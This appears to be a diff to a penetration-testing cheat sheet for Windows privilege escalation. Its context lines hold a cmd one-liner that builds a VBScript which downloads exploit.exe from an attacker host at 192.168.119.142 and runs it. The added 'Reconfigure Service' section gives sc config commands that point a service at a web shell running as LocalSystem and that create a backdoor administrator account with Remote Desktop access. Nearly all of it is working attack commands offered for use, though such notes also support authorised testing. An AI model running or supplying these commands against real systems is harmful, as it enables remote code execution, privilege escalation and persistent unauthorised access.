@@ -67,3 +67,11 @@ Transfer exploit.exe from your kali server to the target server and execute it
 cmd.exe /c "@echo Set objXMLHTTP=CreateObject("MSXML2.XMLHTTP")>poc.vbs&@echo objXMLHTTP.open "GET","http://192.168.119.142/exploit.exe",false>>poc.vbs&@echo objXMLHTTP.send()>>poc.vbs&@echo If objXMLHTTP.Status=200 Then>>poc.vbs&@echo Set objADOStream=CreateObject("ADODB.Stream")>>poc.vbs&@echo objADOStream.Open>>poc.vbs&@echo objADOStream.Type=1 >>poc.vbs&@echo objADOStream.Write objXMLHTTP.ResponseBody>>poc.vbs&@echo objADOStream.Position=0 >>poc.vbs&@echo objADOStream.SaveToFile "exploit.exe">>poc.vbs&@echo objADOStream.Close>>poc.vbs&@echo Set objADOStream=Nothing>>poc.vbs&@echo End if>>poc.vbs&@echo Set objXMLHTTP=Nothing>>poc.vbs&@echo Set objShell=CreateObject("WScript.Shell")>>poc.vbs&@echo objShell.Exec("exploit.exe")>>poc.vbs&cscript.exe poc.vbs"
 ```
 
+## Reconfigure Service
+
+
+Reconfigure Service:
+sc config ServiceName depend= "" start= demand binpath= "C:\Inetpub\wwwroot\shell443.exe" obj= ".\LocalSystem" password= ""
+sc config ServiceName binPath= "cmd /c net user haxxor haxxor123 /add && net localgroup Administrators haxxor /add && net localgroup 'Remote Desktop Users' haxxor /add"
+
+
